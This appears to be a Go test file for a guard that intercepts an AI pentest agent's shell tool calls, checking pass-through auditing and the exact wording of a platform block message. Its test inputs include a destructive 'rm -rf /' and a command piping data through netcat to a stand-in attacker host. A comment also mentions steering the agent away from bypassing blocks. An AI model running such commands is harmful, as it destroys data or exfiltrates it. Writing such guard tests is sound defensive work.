package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// TestSystemBlockMessageFraming pins the platform-governance framing
// (systemBlockMessage). The 【…】 marker prefix MUST stay verbatim: it is the
// detection indicator the Sigma/Suricata/MISP rules match byte-for-byte (see
// detections/). The surrounding prose is the model-facing tool_result that steers
// the pentest agent away from bypassing an intercept block (see guard.go doc
// comment). This test fails if the marker drifts or the message shape changes.
func TestSystemBlockMessageFraming(t *testing.T) {
	got := systemBlockMessage("<reason>")
	want := "【ARTEX 平台管控·非目标防御】This call was blocked by the platform. Reason: <reason>. This operation is prohibited."
	if got != want {
		t.Errorf("systemBlockMessage framing drifted (the 【…】 marker must stay verbatim — it is a detection indicator):\n got %q\nwant %q", got, want)
	}
}

var _ = hook.PreToolUse
